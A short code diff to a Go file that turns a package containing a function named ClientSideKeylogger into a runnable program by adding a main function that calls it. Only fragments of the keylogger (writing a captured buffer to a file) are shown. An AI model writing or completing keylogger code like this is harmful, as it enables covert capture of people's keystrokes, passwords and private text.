@@ -1,4 +1,4 @@
-package client
+package main
 
 import (
 	"fmt"
@@ -49,4 +49,8 @@ func ClientSideKeylogger() {
 			file.Write(buffer[:data])
 		}
 	}
+}
+
+func main() {
+	ClientSideKeylogger()
 }
